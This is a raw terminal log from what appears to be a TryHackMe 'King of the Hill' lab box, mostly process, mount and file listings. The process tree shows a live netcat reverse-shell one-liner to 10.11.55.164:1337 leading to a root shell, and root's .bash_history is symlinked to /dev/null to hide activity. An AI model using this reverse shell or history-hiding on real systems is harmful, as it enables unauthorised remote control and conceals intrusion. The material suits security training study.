root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.7 127672 17920 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:02 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18664  3408 ?        S    23:00   0:00      |   \_ -i
root      5773  0.0  0.3  37080  3444 ?        R    23:08   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.4 106640  4520 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.5 557680 25204 ?        Ssl  22:31   0:07 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.0  1.6 723964 16128 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:20 /li
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=471976k,nr_inodes=117994,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=100684k,mode=755)
/dev/xvda2 on / type ext4 (rw,relatime,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=26,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14822)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
/var/lib/snapd/snaps/core_7270.snap on /snap/core/7270 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core_8689.snap on /snap/core/8689 type squashfs (ro,nodev,relatime,x-gdu.hide)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,size=100680k,mode=700,uid=1003,gid=1003)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
cd /var/tmp
ls -la
total 20
drwxrwxrwt  5 root root 4096 Dec  8 23:00 .
drwxr-xr-x 13 root root 4096 Dec  8 23:01 ..
drwxr-xr-x  2 root root 4096 Dec  8 23:00 .tmp
drwx------  3 root root 4096 Dec  8 22:31 systemd-private-ee7a2edc4a114013b1d14cf181910283-systemd-resolved.service-4Mo6n5
drwx------  3 root root 4096 Dec  8 22:31 systemd-private-ee7a2edc4a114013b1d14cf181910283-systemd-timesyncd.service-CMbPHt
cd .tmp
ls -la
total 8
drwxr-xr-x 2 root root 4096 Dec  8 23:00 .
drwxrwxrwt 5 root root 4096 Dec  8 23:00 ..
cd
ls -la
total 7260
drwx------  4 root root    4096 Dec  8 23:04 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Dec  8 23:04 .bash_history -> /dev/null
-rw-r--r--  1 root root    3385 Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Dec  8 23:00 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Dec  8 23:08 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
cd /etc
ls -lah ld*
-rw-r--r-- 1 root root  26K Mar 20  2020 ld.so.cache
-rw-r--r-- 1 root root   34 Jan 27  2016 ld.so.conf

ld.so.conf.d:
total 20K
drwxr-xr-x  2 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root   38 Jan  8  2018 fakeroot-x86_64-linux-gnu.conf
-rw-r--r--  1 root root   44 Jan 27  2016 libc.conf
-rw-r--r--  1 root root  100 Apr 16  2018 x86_64-linux-gnu.conf

ldap:
total 12K
drwxr-xr-x  2 root root 4.0K Mar 20  2020 .
drwxr-xr-x 95 root root 4.0K Dec  8 23:00 ..
-rw-r--r--  1 root root  332 Jul 26  2019 ldap.conf
cd /lib
ls -la
total 212
drwxr-xr-x 22 root root  4096 Dec  8 22:34 .
drwxr-xr-x 24 root root  4096 Mar 19  2020 ..
drwxr-xr-x  2 root root  4096 Aug  5  2019 apparmor
drwxr-xr-x  2 root root  4096 Aug  5  2019 console-setup
lrwxrwxrwx  1 root root    21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root  4096 Mar 19  2020 crda
drwxr-xr-x  4 root root  4096 Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root  4096 Aug  5  2019 ebtables
drwxr-xr-x 84 root root 20480 Mar 19  2020 firmware
drwxr-xr-x  2 root root  4096 Aug  5  2019 hdparm
drwxr-xr-x  2 root root  4096 Aug  5  2019 init
-rwxr-xr-x  1 root root 74656 Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
lrwxrwxrwx  1 root root    18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root 14416 Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root  4096 Aug  5  2019 lsb
drwxr-xr-x  2 root root  4096 Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root  4096 Mar 19  2020 modules
drwxr-xr-x  2 root root  4096 Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root  4096 Mar 20  2020 netplan
drwxr-xr-x  2 root root  4096 Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root  4096 Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root 12288 Mar 20  2020 systemd
drwxr-xr-x 15 root root  4096 Feb 12  2018 terminfo
drwxr-xr-x  4 root root  4096 Mar 20  2020 udev
drwxr-xr-x  2 root root  4096 Aug  5  2019 ufw
drwxr-xr-x  4 root root 12288 Mar 20  2020 x86_64-linux-gnu
cd
cd /
ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd lib64
ls -lah
total 8.0K
drwxr-xr-x  2 root root 4.0K Aug  5  2019 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
lrwxrwxrwx  1 root root   32 Apr 16  2018 ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.27.so
cd
cd lib
-i: line 131: cd: lib: No such file or directory
cd /lib
ls
apparmor
console-setup
cpp
crda
cryptsetup
ebtables
firmware
hdparm
init
klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
libhandle.so.1
libhandle.so.1.0.3
lsb
modprobe.d
modules
modules-load.d
netplan
open-iscsi
recovery-mode
systemd
terminfo
udev
ufw
x86_64-linux-gnu
cd x86_64-linux-gnu
ls -lah
total 24M
drwxr-xr-x  4 root root  12K Mar 20  2020 .
drwxr-xr-x 22 root root 4.0K Dec  8 22:34 ..
drwxr-xr-x  2 root root 4.0K Mar 20  2020 device-mapper
-rwxr-xr-x  1 root root 167K Apr 16  2018 ld-2.27.so
lrwxrwxrwx  1 root root   10 Apr 16  2018 ld-linux-x86-64.so.2 -> ld-2.27.so
-rw-r--r--  1 root root 6.2K Apr 16  2018 libBrokenLocale-2.27.so
lrwxrwxrwx  1 root root   23 Apr 16  2018 libBrokenLocale.so.1 -> libBrokenLocale-2.27.so
-rw-r--r--  1 root root  19K Apr 16  2018 libSegFault.so
lrwxrwxrwx  1 root root   15 Apr 21  2017 libacl.so.1 -> libacl.so.1.1.0
-rw-r--r--  1 root root  31K Apr 21  2017 libacl.so.1.1.0
lrwxrwxrwx  1 root root   15 Apr  2  2019 libaio.so.1 -> libaio.so.1.0.1
-rw-r--r--  1 root root 5.4K Apr  2  2019 libaio.so.1.0.1
-rw-r--r--  1 root root  15K Apr 16  2018 libanl-2.27.so
lrwxrwxrwx  1 root root   14 Apr 16  2018 libanl.so.1 -> libanl-2.27.so
lrwxrwxrwx  1 root root   20 Sep 27  2018 libapparmor.so.1 -> libapparmor.so.1.4.2
-rw-r--r--  1 root root  63K Sep 27  2018 libapparmor.so.1.4.2
lrwxrwxrwx  1 root root   15 Feb 20  2018 libatm.so.1 -> libatm.so.1.0.0
-rw-r--r--  1 root root  39K Feb 20  2018 libatm.so.1.0.0
lrwxrwxrwx  1 root root   16 Apr 21  2017 libattr.so.1 -> libattr.so.1.1.0
-rw-r--r--  1 root root  19K Apr 21  2017 libattr.so.1.1.0
lrwxrwxrwx  1 root root   17 Feb  7  2018 libaudit.so.1 -> libaudit.so.1.0.0
-rw-r--r--  1 root root 122K Feb  7  2018 libaudit.so.1.0.0
lrwxrwxrwx  1 root root   17 Jan  8  2020 libblkid.so.1 -> libblkid.so.1.1.0
-rw-r--r--  1 root root 305K Jan  8  2020 libblkid.so.1.1.0
lrwxrwxrwx  1 root root   15 Jan 16  2020 libbsd.so.0 -> libbsd.so.0.8.7
-rw-r--r--  1 root root  79K Jan 16  2020 libbsd.so.0.8.7
lrwxrwxrwx  1 root root   15 Jul  4  2019 libbz2.so.1 -> libbz2.so.1.0.4
lrwxrwxrwx  1 root root   15 Jul  4  2019 libbz2.so.1.0 -> libbz2.so.1.0.4
-rw-r--r--  1 root root  66K Jul  4  2019 libbz2.so.1.0.4
-rwxr-xr-x  1 root root 2.0M Apr 16  2018 libc-2.27.so
lrwxrwxrwx  1 root root   12 Apr 16  2018 libc.so.6 -> libc-2.27.so
lrwxrwxrwx  1 root root   18 Sep 24  2017 libcap-ng.so.0 -> libcap-ng.so.0.0.0
-rw-r--r--  1 root root  19K Sep 24  2017 libcap-ng.so.0.0.0
lrwxrwxrwx  1 root root   14 Nov 16  2017 libcap.so.2 -> libcap.so.2.25
-rw-r--r--  1 root root  23K Nov 16  2017 libcap.so.2.25
-rw-r--r--  1 root root 187K Apr 16  2018 libcidn-2.27.so
lrwxrwxrwx  1 root root   15 Apr 16  2018 libcidn.so.1 -> libcidn-2.27.so
lrwxrwxrwx  1 root root   17 Jan 22  2020 libcom_err.so.2 -> libcom_err.so.2.1
-rw-r--r--  1 root root  14K Jan 22  2020 libcom_err.so.2.1
-rw-r--r--  1 root root  39K Apr 16  2018 libcrypt-2.27.so
lrwxrwxrwx  1 root root   16 Apr 16  2018 libcrypt.so.1 -> libcrypt-2.27.so
lrwxrwxrwx  1 root root   23 Aug 23  2018 libcryptsetup.so.12 -> libcryptsetup.so.12.2.0
-rw-r--r--  1 root root 303K Aug 23  2018 libcryptsetup.so.12.2.0
lrwxrwxrwx  1 root root   19 Jun 10  2019 libdbus-1.so.3 -> libdbus-1.so.3.19.4
-rw-r--r--  1 root root 307K Jun 10  2019 libdbus-1.so.3.19.4
-rw-r--r--  1 root root  11K Dec  5  2019 libdevmapper-event-lvm2.so.2.02
lrwxrwxrwx  1 root root   46 Dec  5  2019 libdevmapper-event-lvm2mirror.so -> device-mapper/libdevmapper-event-lvm2mirror.so
lrwxrwxrwx  1 root root   44 Dec  5  2019 libdevmapper-event-lvm2raid.so -> device-mapper/libdevmapper-event-lvm2raid.so
lrwxrwxrwx  1 root root   48 Dec  5  2019 libdevmapper-event-lvm2snapshot.so -> device-mapper/libdevmapper-event-lvm2snapshot.so
lrwxrwxrwx  1 root root   44 Dec  5  2019 libdevmapper-event-lvm2thin.so -> device-mapper/libdevmapper-event-lvm2thin.so
-rw-r--r--  1 root root  27K Dec  5  2019 libdevmapper-event.so.1.02.1
-rw-r--r--  1 root root 423K Dec  5  2019 libdevmapper.so.1.02.1
-rw-r--r--  1 root root  15K Apr 16  2018 libdl-2.27.so
lrwxrwxrwx  1 root root   13 Apr 16  2018 libdl.so.2 -> libdl-2.27.so
lrwxrwxrwx  1 root root   25 Nov 18  2019 libdns-export.so.1100 -> libdns-export.so.1100.1.1
-rw-r--r--  1 root root 2.2M Nov 18  2019 libdns-export.so.1100.1.1
lrwxrwxrwx  1 root root   13 Jan 22  2020 libe2p.so.2 -> libe2p.so.2.3
-rw-r--r--  1 root root  36K Jan 22  2020 libe2p.so.2.3
lrwxrwxrwx  1 root root   17 Sep 10  2019 libexpat.so.1 -> libexpat.so.1.6.7
-rw-r--r--  1 root root 199K Sep 10  2019 libexpat.so.1.6.7
lrwxrwxrwx  1 root root   16 Jan 22  2020 libext2fs.so.2 -> libext2fs.so.2.4
-rw-r--r--  1 root root 317K Jan 22  2020 libext2fs.so.2.4
lrwxrwxrwx  1 root root   17 Jan  8  2020 libfdisk.so.1 -> libfdisk.so.1.1.0
-rw-r--r--  1 root root 408K Jan  8  2020 libfdisk.so.1.1.0
lrwxrwxrwx  1 root root   16 Aug 11  2016 libfuse.so.2 -> libfuse.so.2.9.7
-rw-r--r--  1 root root 239K Aug 11  2016 libfuse.so.2.9.7
-rw-r--r--  1 root root  95K Dec  4  2019 libgcc_s.so.1
lrwxrwxrwx  1 root root   19 Nov 28  2019 libgcrypt.so.20 -> libgcrypt.so.20.2.1
-rw-r--r--  1 root root 1.2M Nov 28  2019 libgcrypt.so.20.2.1
lrwxrwxrwx  1 root root   22 Feb  5  2018 libgpg-error.so.0 -> libgpg-error.so.0.22.0
-rw-r--r--  1 root root  83K Feb  5  2018 libgpg-error.so.0.22.0
lrwxrwxrwx  1 root root   17 Feb  7  2016 libhistory.so.5 -> libhistory.so.5.2
-rw-r--r--  1 root root  35K Feb  7  2016 libhistory.so.5.2
lrwxrwxrwx  1 root root   17 May 15  2017 libhistory.so.7 -> libhistory.so.7.0
-rw-r--r--  1 root root  39K May 15  2017 libhistory.so.7.0
lrwxrwxrwx  1 root root   17 Mar 21  2019 libidn.so.11 -> libidn.so.11.6.16
-rw-r--r--  1 root root 203K Mar 21  2019 libidn.so.11.6.16
lrwxrwxrwx  1 root root   24 Nov 18  2019 libisc-export.so.169 -> libisc-export.so.169.0.1
-rw-r--r--  1 root root 429K Nov 18  2019 libisc-export.so.169.0.1
-rw-r--r--  1 root root 457K Feb  5  2018 libisns-nocrypto.so.0
lrwxrwxrwx  1 root root   18 Jan  7  2018 libjson-c.so.3 -> libjson-c.so.3.0.1
-rw-r--r--  1 root root  43K Jan  7  2018 libjson-c.so.3.0.1
lrwxrwxrwx  1 root root   18 Apr 18  2018 libkeyutils.so.1 -> libkeyutils.so.1.5
-rw-r--r--  1 root root  14K Apr 18  2018 libkeyutils.so.1.5
lrwxrwxrwx  1 root root   16 Nov 12  2018 libkmod.so.2 -> libkmod.so.2.3.2
-rw-r--r--  1 root root  91K Nov 12  2018 libkmod.so.2.3.2
-rw-r--r--  1 root root 1.7M Dec  5  2019 liblvm2app.so.2.2
-rw-r--r--  1 root root 2.4M Dec  5  2019 liblvm2cmd.so.2.02
lrwxrwxrwx  1 root root   16 Jun 28  2017 liblzma.so.5 -> liblzma.so.5.2.2
-rw-r--r--  1 root root 151K Jun 28  2017 liblzma.so.5.2.2
lrwxrwxrwx  1 root root   16 Dec 21  2014 liblzo2.so.2 -> liblzo2.so.2.0.0
-rw-r--r--  1 root root 135K Dec 21  2014 liblzo2.so.2.0.0
-rw-r--r--  1 root root 1.7M Apr 16  2018 libm-2.27.so
lrwxrwxrwx  1 root root   12 Apr 16  2018 libm.so.6 -> libm-2.27.so
-rw-r--r--  1 root root  19K Apr 16  2018 libmemusage.so
lrwxrwxrwx  1 root root   15 Oct  5  2016 libmnl.so.0 -> libmnl.so.0.2.0
-rw-r--r--  1 root root  22K Oct  5  2016 libmnl.so.0.2.0
lrwxrwxrwx  1 root root   17 Jan  8  2020 libmount.so.1 -> libmount.so.1.1.0
-rw-r--r--  1 root root 333K Jan  8  2020 libmount.so.1.1.0
-rw-r--r--  1 root root 167K Apr 16  2018 libmvec-2.27.so
lrwxrwxrwx  1 root root   15 Apr 16  2018 libmvec.so.1 -> libmvec-2.27.so
lrwxrwxrwx  1 root root   17 May 23  2018 libncurses.so.5 -> libncurses.so.5.9
-rw-r--r--  1 root root 138K May 23  2018 libncurses.so.5.9
lrwxrwxrwx  1 root root   18 May 23  2018 libncursesw.so.5 -> libncursesw.so.5.9
-rw-r--r--  1 root root 186K May 23  2018 libncursesw.so.5.9
lrwxrwxrwx  1 root root   18 Jan 12  2018 libnewt.so.0.52 -> libnewt.so.0.52.20
-rw-r--r--  1 root root  92K Jan 12  2018 libnewt.so.0.52.20
lrwxrwxrwx  1 root root   15 Apr 20  2018 libnih.so.1 -> libnih.so.1.0.0
-rw-r--r--  1 root root  99K Apr 20  2018 libnih.so.1.0.0
lrwxrwxrwx  1 root root   19 Jun  2  2017 libnl-3.so.200 -> libnl-3.so.200.24.0
-rw-r--r--  1 root root 127K Jun  2  2017 libnl-3.so.200.24.0
lrwxrwxrwx  1 root root   24 Jun  2  2017 libnl-genl-3.so.200 -> libnl-genl-3.so.200.24.0
-rw-r--r--  1 root root  24K Jun  2  2017 libnl-genl-3.so.200.24.0
-rw-r--r--  1 root root  95K Apr 16  2018 libnsl-2.27.so
lrwxrwxrwx  1 root root   14 Apr 16  2018 libnsl.so.1 -> libnsl-2.27.so
-rw-r--r--  1 root root  39K Apr 16  2018 libnss_compat-2.27.so
lrwxrwxrwx  1 root root   21 Apr 16  2018 libnss_compat.so.2 -> libnss_compat-2.27.so
-rw-r--r--  1 root root  27K Apr 16  2018 libnss_dns-2.27.so
lrwxrwxrwx  1 root root   18 Apr 16  2018 libnss_dns.so.2 -> libnss_dns-2.27.so
-rw-r--r--  1 root root  47K Apr 16  2018 libnss_files-2.27.so
lrwxrwxrwx  1 root root   20 Apr 16  2018 libnss_files.so.2 -> libnss_files-2.27.so
-rw-r--r--  1 root root  23K Apr 16  2018 libnss_hesiod-2.27.so
lrwxrwxrwx  1 root root   21 Apr 16  2018 libnss_hesiod.so.2 -> libnss_hesiod-2.27.so
-rw-r--r--  1 root root  47K Apr 16  2018 libnss_nis-2.27.so
lrwxrwxrwx  1 root root   18 Apr 16  2018 libnss_nis.so.2 -> libnss_nis-2.27.so
-rw-r--r--  1 root root  55K Apr 16  2018 libnss_nisplus-2.27.so
lrwxrwxrwx  1 root root   22 Apr 16  2018 libnss_nisplus.so.2 -> libnss_nisplus-2.27.so
-rw-r--r--  1 root root 248K Feb  6  2020 libnss_systemd.so.2
lrwxrwxrwx  1 root root   20 Mar 21  2019 libntfs-3g.so.88 -> libntfs-3g.so.88.0.0
-rw-r--r--  1 root root 315K Mar 21  2019 libntfs-3g.so.88.0.0
lrwxrwxrwx  1 root root   16 Feb 27  2019 libpam.so.0 -> libpam.so.0.83.1
-rw-r--r--  1 root root  55K Feb 27  2019 libpam.so.0.83.1
lrwxrwxrwx  1 root root   21 Feb 27  2019 libpam_misc.so.0 -> libpam_misc.so.0.82.0
-rw-r--r--  1 root root  15K Feb 27  2019 libpam_misc.so.0.82.0
lrwxrwxrwx  1 root root   17 Feb 27  2019 libpamc.so.0 -> libpamc.so.0.82.1
-rw-r--r--  1 root root  15K Feb 27  2019 libpamc.so.0.82.1
lrwxrwxrwx  1 root root   18 Mar 14  2019 libparted.so.2 -> libparted.so.2.0.1
-rw-r--r--  1 root root 293K Mar 14  2019 libparted.so.2.0.1
lrwxrwxrwx  1 root root   15 Feb 10  2019 libpci.so.3 -> libpci.so.3.5.2
-rw-r--r--  1 root root  52K Feb 10  2019 libpci.so.3.5.2
-rw-r--r--  1 root root 6.1K Apr 16  2018 libpcprofile.so
lrwxrwxrwx  1 root root   17 Feb  3  2018 libpcre.so.3 -> libpcre.so.3.13.3
-rw-r--r--  1 root root 454K Feb  3  2018 libpcre.so.3.13.3
lrwxrwxrwx  1 root root   27 Apr  4  2019 libply-boot-client.so.4 -> libply-boot-client.so.4.0.0
-rw-r--r--  1 root root  23K Apr  4  2019 libply-boot-client.so.4.0.0
lrwxrwxrwx  1 root root   27 Apr  4  2019 libply-splash-core.so.4 -> libply-splash-core.so.4.0.0
-rw-r--r--  1 root root  95K Apr  4  2019 libply-splash-core.so.4.0.0
lrwxrwxrwx  1 root root   31 Apr  4  2019 libply-splash-graphics.so.4 -> libply-splash-graphics.so.4.0.0
-rw-r--r--  1 root root  39K Apr  4  2019 libply-splash-graphics.so.4.0.0
lrwxrwxrwx  1 root root   15 Apr  4  2019 libply.so.4 -> libply.so.4.0.0
-rw-r--r--  1 root root  87K Apr  4  2019 libply.so.4.0.0
lrwxrwxrwx  1 root root   18 Aug  9  2019 libprocps.so.6 -> libprocps.so.6.0.0
-rw-r--r--  1 root root  71K Aug  9  2019 libprocps.so.6.0.0
-rwxr-xr-x  1 root root 142K Apr 16  2018 libpthread-2.27.so
lrwxrwxrwx  1 root root   18 Apr 16  2018 libpthread.so.0 -> libpthread-2.27.so
lrwxrwxrwx  1 root root   18 Feb  7  2016 libreadline.so.5 -> libreadline.so.5.2
-rw-r--r--  1 root root 244K Feb  7  2016 libreadline.so.5.2
lrwxrwxrwx  1 root root   18 May 15  2017 libreadline.so.7 -> libreadline.so.7.0
-rw-r--r--  1 root root 288K May 15  2017 libreadline.so.7.0
-rw-r--r--  1 root root  99K Apr 16  2018 libresolv-2.27.so
lrwxrwxrwx  1 root root   17 Apr 16  2018 libresolv.so.2 -> libresolv-2.27.so
-rw-r--r--  1 root root  31K Apr 16  2018 librt-2.27.so
lrwxrwxrwx  1 root root   13 Apr 16  2018 librt.so.1 -> librt-2.27.so
lrwxrwxrwx  1 root root   19 May  3  2019 libseccomp.so.2 -> libseccomp.so.2.4.1
-rw-r--r--  1 root root 283K May  3  2019 libseccomp.so.2.4.1
-rw-r--r--  1 root root 152K Mar  1  2018 libselinux.so.1
-rw-r--r--  1 root root 685K Sep  9  2017 libsepol.so.1
lrwxrwxrwx  1 root root   17 Feb 24  2018 libslang.so.2 -> libslang.so.2.3.1
-rw-r--r--  1 root root 1.3M Feb 24  2018 libslang.so.2.3.1
lrwxrwxrwx  1 root root   21 Jan  8  2020 libsmartcols.so.1 -> libsmartcols.so.1.1.0
-rw-r--r--  1 root root 192K Jan  8  2020 libsmartcols.so.1.1.0
lrwxrwxrwx  1 root root   12 Jan 22  2020 libss.so.2 -> libss.so.2.0
-rw-r--r--  1 root root  26K Jan 22  2020 libss.so.2.0
lrwxrwxrwx  1 root root   20 Feb  6  2020 libsystemd.so.0 -> libsystemd.so.0.21.0
-rw-r--r--  1 root root 525K Feb  6  2020 libsystemd.so.0.21.0
-rw-r--r--  1 root root  35K Apr 16  2018 libthread_db-1.0.so
lrwxrwxrwx  1 root root   19 Apr 16  2018 libthread_db.so.1 -> libthread_db-1.0.so
lrwxrwxrwx  1 root root   15 May 23  2018 libtinfo.so.5 -> libtinfo.so.5.9
-rw-r--r--  1 root root 167K May 23  2018 libtinfo.so.5.9
